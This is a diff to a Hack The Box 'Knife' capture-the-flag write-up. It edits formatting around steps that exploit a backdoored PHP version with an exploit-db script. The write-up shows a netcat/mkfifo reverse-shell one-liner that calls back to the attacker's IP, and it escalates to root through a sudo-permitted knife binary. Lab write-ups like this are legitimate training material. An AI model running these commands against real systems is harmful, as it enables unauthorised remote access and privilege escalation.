@@ -73,7 +73,6 @@ Doing some research we know that this PHP version was released with a backdoor. 
 Using the script i´ve found in exploitdb i´ve got an non stable shell in the server. 
 
 ```
-bash
 Enter the full host url:
 http://10.10.10.242/
 
@@ -110,7 +109,6 @@ To get an interactive shell i set up a listener in my machine running on port 44
 
 #### Remote shell execution 
 ```
-bash
 └─$ python 49933.py
 Enter the full host url:
 http://10.10.10.242/
@@ -118,7 +116,6 @@ http://10.10.10.242/
 Interactive shell is opened on http://10.10.10.242/ 
 Can't acces tty; job crontol turned off.
 $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.71 4443 >/tmp/f
-
 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -148,7 +145,6 @@ james@knife:/$ cd /home/james
 
 A common way to get privileges in a machine is by searching SUID binaries, which can be executed with the privileges of an owner or group, this can help us to get a privileged shell. 
 ```
-bash
 james@knife:/$ sudo -l     
 sudo -l
 Matching Defaults entries for james on knife:
@@ -158,7 +154,8 @@ User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 ```
 
-Ive look for the knife binary that we can run it as root and found that can help us to get the root shell.
+Ive look for the knife binary that we can run it as root and found that can help us to get the root shell.(https://gtfobins.github.io/)
+
 
 ![](../assets/images/htb-writeup-knife/web-gtfobins.png)
 
